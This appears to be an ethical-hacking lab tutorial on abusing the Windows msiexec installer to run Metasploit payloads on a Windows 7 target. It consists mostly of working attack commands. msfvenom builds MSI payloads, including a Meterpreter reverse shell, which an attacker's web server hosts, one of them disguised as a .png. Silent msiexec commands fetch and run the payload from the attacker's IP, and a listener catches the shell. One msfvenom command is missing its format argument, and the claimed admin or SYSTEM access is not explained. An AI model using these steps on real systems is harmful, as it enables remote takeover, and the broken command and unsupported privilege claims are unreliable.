# Windows Installer Files exploit via msiexec 
Microsoft windows programs are determined based on extensions, executable files are end with .exe and installer files are end with .msi, .msp and etc.
Using this files format bypassing techniques and exploitation techniques will demostrate.

## Prerequstite for this Lab
- Windows 7
- Kali Linux
- Metasploit Framework

## ByPassing command prompt with msi file format

Click run as administrator.
<p align="center"><img src="https://github.com/AungZayMyo/Ethical-Hacking/assets/154745254/020df3b1-f97f-49b3-8d23-9ad30d156954" width="400px" height="250px"><br>Figure (1)</p>
Password is required.
<p align="center"><img src="https://github.com/AungZayMyo/Ethical-Hacking/assets/154745254/32b4435e-370c-41c7-9dc4-ead1977c6b45" width="400px" height="250px"><br>Figure (2)</p>

We will generate payload with metasploit. Type following in kali linux terminal.
```
msfvenom -p windows/exec CMD=cmd.exe -f > cmd.msi
```
<p align="center"><img src="https://github.com/AungZayMyo/Ethical-Hacking/assets/154745254/20a0476b-1a53-4fbd-86c5-c5b2ba1f13ab" width="400px" height="250px"><br>Figure (3)</p>

After that, we will host to share file between hosts. We will use python module to file share.

```
python3 -m http.server -b [kalilinux IP] 80 
```

<p align="center"><img src="https://github.com/AungZayMyo/Ethical-Hacking/assets/154745254/d3bff317-86eb-42c4-9013-a7ed6443780b" width="400px" height="250px"><br>Figure (4)</p>
Victim can access files and download cmd.msi and save it on Desktop.

<p align="center"><img src="https://github.com/AungZayMyo/Ethical-Hacking/assets/154745254/6ef19e95-af21-472c-aa5b-4914798d1285" width="400px" height="250px"><br>Figure (5)</p>

Open windows run box by pressing ` win key + r `. In run box type following commands.
```
msiexec /quiet /i C:\Users\localuser\Desktop\cmd.msi
```
<p align="center"><img src="https://github.com/AungZayMyo/Ethical-Hacking/assets/154745254/fc7945a2-28d5-4b45-91fc-d96a59797f63" width="400px" height="250px"><br>Figure (6)</p>
We have command prompt with admin access.
<p align="center"><img src="https://github.com/AungZayMyo/Ethical-Hacking/assets/154745254/1c1617f0-6deb-4cc3-aa03-5fd220340426" width="400px" height="250px"><br>Figure (7)</p>

## ByPass with png extension

We will move from cmd.msi to cmd.png by using mv command in kali linux.

```
mv cmd.msi cmd.png
```
<p align="center"><img src="https://github.com/AungZayMyo/Ethical-Hacking/assets/154745254/f16a0d0d-9189-4c6f-8e18-b1c87c1c2d4e" width="400px" height="250px"><br>Figure (8)</p>

We can access from attacker IP address.
<p align="center"><img src="https://github.com/AungZayMyo/Ethical-Hacking/assets/154745254/1dfb53be-2430-43f0-ab72-9802641824eb" width="400px" height="250px"><br>Figure (9)</p>

```
msiexec /quiet /i http://[kalilinuIP]/cmd.png
```
<p align="center"><img src="https://github.com/AungZayMyo/Ethical-Hacking/assets/154745254/8c72d70f-376a-4b20-808e-c7c1c1eee0f6" width="400px" height="250px"><br>Figure (10)</p>

Here we got command prompt with system access.
<p align="center"><img src="https://github.com/AungZayMyo/Ethical-Hacking/assets/154745254/352b2af4-04d8-42b5-b57e-976c1096e3a9" width="400px" height="250px"><br>Figure (11)</p>

## Getting shell with msi file extension

We will generate payload with msfvenom command.
```
msfvenom -p windows/meterpreter/reverse_tcp lhost=kali-ip lport=4444 -f msi > shell.msi
```
<p align="center"><img src="https://github.com/AungZayMyo/Ethical-Hacking/assets/154745254/b968bc4e-f535-4521-9ff7-786c4866e39d" width="400px" height="250px"><br>Figure (12</p>

After that, we will host to share file between hosts. We will use python module to file share.

```
python3 -m http.server -b [kalilinux IP] 80 
```
<p align="center"><img src="https://github.com/AungZayMyo/Ethical-Hacking/assets/154745254/dcb27d2b-95d1-4025-a8fd-fd6c8ad9364b" width="400px" height="250px"><br>Figure (13)</p>

We need to create payload lister in kalilinux. To do that goes to Metasploit framework by typing ` msfconsole `. And type following.

```
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST kali-IP
set LPORT 4444
exploit
```
<p align="center"><img src="https://github.com/AungZayMyo/Ethical-Hacking/assets/154745254/5881a8bc-9567-4187-8231-82af94cf48bb" width="400px" height="250px"><br>Figure (14)</p>
Type following in windows command prompt.

```
msiexec /quiet /i http://[kalilinuIP]/shell.msi
```
<p align="center"><img src="https://github.com/AungZayMyo/Ethical-Hacking/assets/154745254/dd76152f-663f-4afc-a652-c6cba7a4f49f" width="400px" height="250px"><br>Figure (15)</p>

We got a reverse_tcp shell from windows 7 machine. Type ` sysinfo ` to see system information.
<p align="center"><img src="https://github.com/AungZayMyo/Ethical-Hacking/assets/154745254/9d5168e1-3fcb-48f8-94da-a5e46b5a864e" width="400px" height="250px"><br>Figure (16)</p>

## Conclusion

In this tutorial, Windows installer file format exploitation and bypassing techniques are demostrated. Do more Practice and Expert it!. <br>
**2/12/2024** <br>
Contributed By - Jord@n
